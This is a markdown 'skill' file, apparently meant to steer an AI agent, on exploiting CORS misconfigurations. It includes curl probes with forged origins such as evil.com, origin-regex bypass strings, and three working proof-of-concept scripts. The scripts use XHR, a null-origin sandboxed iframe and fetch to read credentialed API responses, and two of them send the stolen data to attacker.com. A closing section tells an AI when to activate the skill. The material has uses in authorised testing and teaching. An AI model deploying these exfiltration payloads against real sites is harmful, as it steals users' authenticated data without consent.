# CORS Bypass Skill

## Goal

Identify and exploit Cross-Origin Resource Sharing (CORS) misconfigurations to steal sensitive data cross-origin.

## Methodology

1. **Identify CORS Headers:** Check Access-Control-Allow-Origin in responses
2. **Test Origin Reflection:** Send requests with various Origin headers
3. **Check Null Origin:** Test if `null` origin is allowed (sandboxed iframes)
4. **Verify Credentials:** Check if Access-Control-Allow-Credentials is enabled
5. **Exploit Misconfiguration:** Steal data using cross-origin requests

## Testing for CORS Misconfigs

```bash
# Test origin reflection
curl -H "Origin: https://evil.com" -I https://target.com/api/user

# Look for:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

## Common Misconfigurations

### Full Origin Reflection
```http
Request:
Origin: https://evil.com

Response:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

### Null Origin Allowed
```http
Request:
Origin: null

Response:
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

### Subdomain Wildcard
```http
# Reflected if subdomain matches pattern
Origin: https://evil.target.com
Access-Control-Allow-Origin: https://evil.target.com
```

### Regex Bypass
```http
# If regex is: ^https://.*\.target\.com$
Origin: https://evil.target.com.attacker.com
Origin: https://target.com.attacker.com
```

## Exploitation PoC

```html
<!-- Basic CORS exploit -->
<script>
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;  // Send cookies
xhr.open('GET', 'https://vulnerable.com/api/user', true);
xhr.onload = function() {
  // Exfiltrate data
  fetch('https://attacker.com/log?data=' + encodeURIComponent(xhr.responseText));
};
xhr.send();
</script>
```

### Null Origin Exploit (via sandbox)
```html
<iframe sandbox="allow-scripts allow-forms" srcdoc="
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://vulnerable.com/api/user', true);
xhr.withCredentials = true;
xhr.onload = function() {
  parent.postMessage(xhr.responseText, '*');
};
xhr.send();
</script>
"></iframe>
```

### Fetch API Exploit
```javascript
fetch('https://vulnerable.com/api/sensitive', {
  credentials: 'include'
})
.then(response => response.json())
.then(data => {
  navigator.sendBeacon('https://attacker.com/log', JSON.stringify(data));
});
```

## Tools

* **Burp Suite** - Test CORS headers and exploit
* **curl** - Quick header testing
* **CORScanner** - Automated CORS misconfiguration scanner

## Example Commands

```bash
# Test multiple origins
for origin in https://evil.com null https://target.com.evil.com; do
  echo "Testing: $origin"
  curl -sI -H "Origin: $origin" https://target.com/api | grep -i "access-control"
done
```

## Guidance for AI

* Activate when testing APIs that return Access-Control-Allow-Origin headers
* Dangerous when ACAO reflects origin AND ACAC is true
* `Access-Control-Allow-Origin: *` alone isn't exploitable (no credentials)
* Test null origin for sandboxed iframe exploitation
* Look for subdomain matching that could be bypassed
* CORS only protects reading responses, not sending requests
* Pre-flight requests (OPTIONS) add extra protection for non-simple requests
